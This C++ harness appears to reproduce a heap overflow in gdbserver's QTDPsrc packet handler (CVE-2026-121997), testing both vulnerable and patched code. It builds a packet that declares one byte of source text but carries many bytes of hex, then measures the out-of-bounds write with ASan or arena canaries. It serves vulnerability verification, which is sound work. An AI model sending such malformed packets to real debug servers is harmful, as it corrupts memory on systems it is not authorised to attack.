// Direct-call driver for CVE-2026-121997 (gdbserver cmd_qtdpsrc).
// Compiled as C++: the pinned function and RSP helpers are GDB C++ source.
// The vulnerable function and unpack_varlen_hex are verbatim pinned slices;
// hex2bin is a faithful reimplementation of GDB's byte decode (documented in
// PROVENANCE.md). All other names below are test stubs.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>

typedef unsigned long long ULONGEST;
typedef unsigned char gdb_byte;

static const char *pulongest (ULONGEST v)
{
  static char b[32];
  snprintf (b, sizeof (b), "%llu", v);
  return b;
}

static const char *paddress (ULONGEST a)
{
  static char b[32];
  snprintf (b, sizeof (b), "%llx", a);
  return b;
}

static void write_ok (char *b) { snprintf (b, 16, "OK"); }
static void write_enn (char *b) { snprintf (b, 16, "E01"); }
#define trace_debug(...) do { } while (0)

struct source_string
{
  char *type;
  char *str;
  struct source_string *next;
};

struct tracepoint
{
  int num;
  ULONGEST addr;
  struct source_string *source_strings;
};

static struct tracepoint the_tp;
static struct tracepoint *
find_tracepoint (int num, ULONGEST addr)
{
  (void) num;
  (void) addr;
  return &the_tp;
}

// --- allocation: real malloc under ASan, a poisoned arena in plain mode ----
static int g_plain;
static unsigned char arena[1 << 16];
static size_t arena_off;
static int alloc_no;
static size_t src_off, src_size;
static int canary_written, canary_first, canary_last, canary_ok;

static unsigned char
pattern (size_t i)
{
  return (unsigned char) (0x41 + (i & 0x1f));
}

static char *
xmalloc (size_t n)
{
  alloc_no++;
  if (!g_plain)
    return (char *) malloc (n);
  size_t aligned = (n + 15) & ~(size_t) 15;
  char *p = (char *) (arena + arena_off);
  if (alloc_no == 2)
    {
      src_off = arena_off;
      src_size = n;
    }
  arena_off += aligned;
  return p;
}

static void
xfree (void *p)
{
  if (!g_plain)
    free (p);
}

#define XNEW(T) ((T *) xmalloc (sizeof (T)))

// RSP helpers, extracted verbatim from gdbsupport/rsp-low.cc at the pinned
// commit into rsp_helpers.inc by run.sh.
#include "rsp_helpers.inc"

// hex2bin, faithful reimplementation of GDB's fixed-count hex decoder:
// decode COUNT bytes, two nibbles each, into BIN; return COUNT.
static int
hex2bin (const char *hex, gdb_byte *bin, int count)
{
  int i;
  for (i = 0; i < count; ++i)
    {
      int v = 0;
      int shift;
      for (shift = 4; shift >= 0; shift -= 4)
        {
          int nib = (unsigned char) *hex++;
          if (nib >= '0' && nib <= '9')
            v |= (nib - '0') << shift;
          else if (nib >= 'a' && nib <= 'f')
            v |= (nib - 'a' + 10) << shift;
          else if (nib >= 'A' && nib <= 'F')
            v |= (nib - 'A' + 10) << shift;
          else
            {
              fprintf (stderr, "HEX2BIN_BAD_NIBBLE=1\n");
              exit (81);
            }
          }
      bin[i] = (gdb_byte) v;
    }

  if (g_plain && alloc_no >= 2)
    {
      canary_written = canary_first = canary_last = 0;
      canary_ok = 1;
      for (size_t k = src_size; k < (size_t) count; ++k)
        if (arena[src_off + k] != 0xEE)
          {
            canary_written++;
            if (canary_first == 0)
              canary_first = (int) k;
            canary_last = (int) k;
            if (arena[src_off + k] != pattern (k))
              canary_ok = 0;
          }
    }

  return i;
}

// The pinned cmd_qtdpsrc() slice, extracted by run.sh from either the
// vulnerable HEAD snapshot or the patched snapshot.
#include "qtdpsrc_fn.inc"

int
main (int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "attack";
  int n = argc > 2 ? atoi (argv[2]) : 32;
  if (n < 1 || n > 128)
    return 90;
  g_plain = getenv ("PLAIN_MODE") != nullptr;
  if (g_plain)
    memset (arena, 0xEE, sizeof (arena));

  char hex[512];
  char own_buf[1024];
  for (int i = 0; i < n; ++i)
    snprintf (hex + 2 * i, 3, "%02x", pattern ((size_t) i));
  hex[2 * n] = '\0';
  ULONGEST slen = (strcmp (mode, "safe") == 0) ? (ULONGEST) n : 1ULL;
  snprintf (own_buf, sizeof (own_buf), "QTDPsrc:1:0:cond:0:%llx:%s", slen, hex);
  printf ("MODE=%s USEDLEN=%d DECLARED=%llu EXPECTED_OOB=%d\n",
          mode, n, slen, (strcmp (mode, "safe") == 0) ? 0 : n - 2);
  fflush (stdout);

  cmd_qtdpsrc (own_buf);
  printf ("RC=0 REPLY=%s LIST_LEN=%d\n", own_buf,
          the_tp.source_strings ? 1 : 0);
  if (g_plain)
    printf ("PLAIN N=%d DECLARED=%llu ALLOC=%zu WRITTEN=%d FIRST=%d LAST=%d "
            "PATTERN_OK=%d\n",
            n, slen, src_size, canary_written, canary_first, canary_last,
            canary_ok);
  return 0;
}
